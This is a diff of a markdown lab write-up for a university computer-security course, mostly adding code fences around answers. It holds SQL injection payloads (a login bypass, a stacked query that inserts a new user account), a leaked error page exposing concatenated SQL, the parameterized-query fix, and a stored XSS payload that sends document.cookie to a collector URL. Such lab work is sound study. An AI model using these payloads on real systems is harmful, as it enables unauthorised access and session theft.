@@ -1,9 +1,9 @@
-#Task 1
+# Task 1
 
 ' or '1'='1
 
 
-#Task 2
+# Task 2
 
 After inserting wrong SQL injection we get part of source code that caused exception.
 
@@ -20,19 +20,21 @@ Unclosed quotation mark after the character string '" ---' AND Password='''.
 
 Source Error:
 
-
+```
 Line 25:             SqlCommand sqlc = new SqlCommand("SELECT Record FROM Table_Users WHERE Username='" + username + "' AND Password='" + password + "'");
 Line 26:             sqlc.Connection = conn;
 Line 27:             SqlDataReader sdr = sqlc.ExecuteReader();
 Line 28:             if (sdr.HasRows == false)
 Line 29:             {
+```
 
-
-Source File: E:\EDA263_Computer-Security\EDA263_CODE\Lab4\cs_lab4\myWebApplication\SQLaccess.cs    Line: 27
+Source File: 
+```E:\EDA263_Computer-Security\EDA263_CODE\Lab4\cs_lab4\myWebApplication\SQLaccess.cs    Line: 27
+```
 
 Stack Trace:
 
-
+```
 [SqlException (0x80131904): Incorrect syntax near 'wrong'.
 Unclosed quotation mark after the character string '" ---' AND Password='''.]
    System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +2444190
@@ -58,7 +60,7 @@ Unclosed quotation mark after the character string '" ---' AND Password='''.]
 
 
 Version Information: Microsoft .NET Framework Version:4.0.30319; ASP.NET Version:4.7.2633.0 
-
+```
 
 # Task 3
 
@@ -66,9 +68,12 @@ Version Information: Microsoft .NET Framework Version:4.0.30319; ASP.NET Version
 - Can you create a new account without having administrative privileges? 
 - How did you do it?
 
+```
 SqlCommand sqlc = new SqlCommand("SELECT Record FROM Table_Users WHERE Username='" + username + "' AND Password='" + password + "'");
+```
 
 Comment will do nothing:
+```
 `--`
 
 '; ... ;-- 
@@ -78,21 +83,22 @@ Comment will do nothing:
 '; INSERT INTO Table_Users (Username, Password) VALUES ('adminxxx','adminxxx') ;-- 
 
 ' except CREATE TABLE Table_Users (Username varchar(30), Password varchar(30)) ; -- 
-
+```
 
 # Task 4
-
+```
 //Task 4: uncomment here
 SqlCommand sqlc = new SqlCommand("SELECT Record FROM Table_Users WHERE Username=@username AND Password=@password");
 sqlc.Parameters.AddWithValue("@username", username);
 sqlc.Parameters.AddWithValue("@password", password);
-
+```
 # Task 5
 
 Cross-site scripting:
 
 Go to feedback and upload:
+```
 %3cscript>document.write('%3cimg src="http://localhost:49834/WriteCookie.aspx?Cookie='%2bdocument.cookie%2b'">');%3c/script>
-
+```
 
 
